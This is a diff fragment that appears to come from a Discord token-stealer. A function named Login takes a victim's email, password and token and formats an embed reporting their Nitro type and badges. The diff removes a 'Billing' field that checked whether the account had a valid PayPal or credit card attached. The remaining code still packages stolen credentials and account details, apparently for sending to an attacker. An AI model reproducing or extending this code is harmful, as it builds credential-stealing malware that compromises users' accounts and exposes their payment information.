@@ -163,26 +163,7 @@ function Login(email, password, token) {
                                                                                                    
                                    "value": `<a:pepe_nitro:906950345983397988> **Nitro Type:**  ${GetNitro(json.premium_type)}\n                                 <a:allbadges:895906088996720690> **Badges:**  ${GetBadges(json.flags)}`,
                                  },
-                                 {
-                                    name: "Billing",
-                                    value: `${(function () {
-                                        const e = JSON.parse(s);
-                                        var t = "";
-                                        return (
-                                            e.forEach((e) => {
-                                                if ("" == e.type) return "`❌`";
-                                                if (2 == e.type && 1 != e.invalid) t += "`✔️` <:paypal:896441236062347374>";
-                                                else {
-                                                    if (1 != e.type || 1 == e.invalid) return "`❌`";
-                                                    t += "`✔️` :credit_card:";
-                                                }
-                                            }),
-                                            "" == t && (t = "`❌`"),
-                                            t
-                                        );
-                                    })()}`,
-                                    inline: !1,
-                                },
+
 
 
                                  {
